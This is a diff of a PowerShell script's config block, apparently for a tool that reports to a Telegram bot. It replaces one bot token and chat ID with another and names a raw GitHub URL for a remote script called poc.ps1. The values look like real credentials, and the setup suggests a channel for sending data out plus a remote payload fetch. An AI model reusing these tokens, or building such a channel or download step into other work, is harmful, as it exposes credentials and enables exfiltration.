@@ -18,8 +18,8 @@ BOT TELEGRAM:
 ## CONFIG ##
 ############
 
-$BotToken = "5666049912:AAHZth6IPRFSKVjx-6sYNLtR4hEOo92tqhA"
-$ChatID = '-1001799282824'
+$BotToken = "6226528520:AAF7BiFovtItMQXyluxowWho3hJQyTaKats"
+$ChatID = '-885527592'
 $githubScript = 'https://raw.githubusercontent.com/mishustick123/1/main/poc.ps1'
 
 
